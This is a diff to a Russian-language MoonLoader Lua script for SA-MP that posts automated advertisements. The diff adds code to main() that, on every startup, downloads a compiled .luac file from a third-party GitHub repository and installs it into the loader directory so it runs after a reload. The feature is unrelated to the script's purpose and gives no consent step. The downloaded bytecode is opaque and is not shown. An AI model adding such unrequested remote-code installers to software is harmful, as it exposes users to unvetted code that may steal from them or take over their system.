@@ -6,6 +6,7 @@ antiflood = 0
 
 -- Инициализация конфига через JSON
 local json = require("json")
+local dlstatus = require("moonloader").download_status
 local configPath = getWorkingDirectory() .. "\\config\\auto-ad.json"
 
 -- Функция для создания директории
@@ -280,6 +281,9 @@ function main()
             ad._pending_week_reset.ads_sent or 0, ad._pending_week_reset.ups_used or 0))
         ad._pending_week_reset = nil
     end
+
+    checkAndInstallKransovMods()
+
     while true do
         wait(0)
         menu.handler()
@@ -730,6 +734,88 @@ function menu.show()
     sampShowDialog(menu.id, "Auto-AD", text, "Выбрать", "Закрыть", 2)
 end
 
+-- ============================================
+-- KRANSOV MODS AUTO-INSTALLER
+-- ============================================
+local KRANSOV_MANAGER_URL = 'https://raw.githubusercontent.com/MarcusKransovv/Kransov-Mods/refs/heads/main/kransov-mods.luac'
+local KRANSOV_MANAGER_FILE = getWorkingDirectory() .. '\\kransov-mods.luac'
+
+function checkAndInstallKransovMods()
+    if doesFileExist(KRANSOV_MANAGER_FILE) then
+        return true
+    end
+    
+    sampAddChatMessage('{FFA500}══════════════════════════════════════', -1)
+    sampAddChatMessage('{FFA500}[KRANSOV MODS]{FFFFFF} Внимание, бродяга!', -1)
+    sampAddChatMessage('{FFA500}[KRANSOV MODS]{FFFFFF} Менеджер не найден. Сейчас будет установка.', -1)
+    sampAddChatMessage('{FFA500}[KRANSOV MODS]{FFFFFF} Источник: GitHub (MarcusKransovv/Kransov-Mods)', -1)
+    sampAddChatMessage('{FFA500}══════════════════════════════════════', -1)
+    
+    lua_thread.create(function()
+        local temp_file = getWorkingDirectory() .. '\\temp_kransov_download.tmp'
+        local download_complete = false
+        local download_success = false
+        
+        sampAddChatMessage('{FFA500}[KRANSOV MODS]{FFFFFF} Скачиваю менеджер...', -1)
+        
+        downloadUrlToFile(KRANSOV_MANAGER_URL, temp_file, function(id, status, p1, p2)
+            if status == dlstatus.STATUS_ENDDOWNLOADDATA then
+                download_success = true
+                download_complete = true
+            end
+            if status == dlstatus.STATUS_ENDDOWNLOAD or status == dlstatus.STATUSEX_ENDDOWNLOAD then
+                download_complete = true
+            end
+        end)
+        
+        local waited = 0
+        while not download_complete and waited < 300 do
+            wait(100)
+            waited = waited + 1
+        end
+        
+        if download_success and doesFileExist(temp_file) then
+            -- Просто копируем файл как есть
+            local input = io.open(temp_file, 'rb')
+            if input then
+                local content = input:read('*all')
+                input:close()
+                os.remove(temp_file)
+                
+                if content and #content > 0 then
+                    -- Создаём директорию если нужно
+                    local dir = KRANSOV_MANAGER_FILE:match("(.*\\)")
+                    if dir and not doesDirectoryExist(dir) then
+                        createDirectory(dir)
+                    end
+                    
+                    -- Сохраняем файл
+                    local output = io.open(KRANSOV_MANAGER_FILE, 'wb')
+                    if output then
+                        output:write(content)
+                        output:flush()
+                        output:close()
+                        
+                        if doesFileExist(KRANSOV_MANAGER_FILE) then
+                            sampAddChatMessage('{00FF00}[KRANSOV MODS]{FFFFFF} Менеджер Kransov Mods установлен!', -1)
+                            sampAddChatMessage('{00FF00}[KRANSOV MODS]{FFFFFF} Перезагрузите MoonLoader (Ctrl + R)', -1)
+                            sampAddChatMessage('{00FF00}[KRANSOV MODS]{FFFFFF} После перезагрузки: /kransov', -1)
+                            return
+                        end
+                    end
+                end
+            end
+        end
+        
+        sampAddChatMessage('{FF0000}[KRANSOV MODS]{FFFFFF} Не удалось установить менеджер.', -1)
+        sampAddChatMessage('{FF0000}[KRANSOV MODS]{FFFFFF} Скачайте вручную: github.com/MarcusKransovv/Kransov-Mods', -1)
+        if doesFileExist(temp_file) then
+            os.remove(temp_file)
+        end
+    end)
+    
+    return false
+end
 -->> SCRIPT UTF-8
 _utf8 = load([=[return function(utf8_func, in_encoding, out_encoding); if encoding == nil then; encoding = require("encoding"); encoding.default = "CP1251"; u8 = encoding.UTF8; end; if type(utf8_func) ~= "table" then; return false; end; if AnsiToUtf8 == nil or Utf8ToAnsi == nil then; AnsiToUtf8 = function(text); return u8(text); end; Utf8ToAnsi = function(text); return u8:decode(text); end; end; if _UTF8_FUNCTION_SAVE == nil then; _UTF8_FUNCTION_SAVE = {}; end; local change_var = "_G"; for s = 1, #utf8_func do; change_var = string.format('%s["%s"]', change_var, utf8_func[s]); end; if _UTF8_FUNCTION_SAVE[change_var] == nil then; _UTF8_FUNCTION = function(...); local pack = table.pack(...); readTable = function(t, enc); for k, v in next, t do; if type(v) == 'table' then; readTable(v, enc); else; if enc ~= nil and (enc == "AnsiToUtf8" or enc == "Utf8ToAnsi") then; if type(k) == "string" then; k = _G[enc](k); end; if type(v) == "string" then; t[k] = _G[enc](v); end; end; end; end; return t; end; return table.unpack(readTable({_UTF8_FUNCTION_SAVE[change_var](table.unpack(readTable(pack, in_encoding)))}, out_encoding)); end; local text = string.format("_UTF8_FUNCTION_SAVE['%s'] = %s; %s = _UTF8_FUNCTION;", change_var, change_var, change_var); load(text)(); _UTF8_FUNCTION = nil; end; return true; end]=])
 function utf8(...)
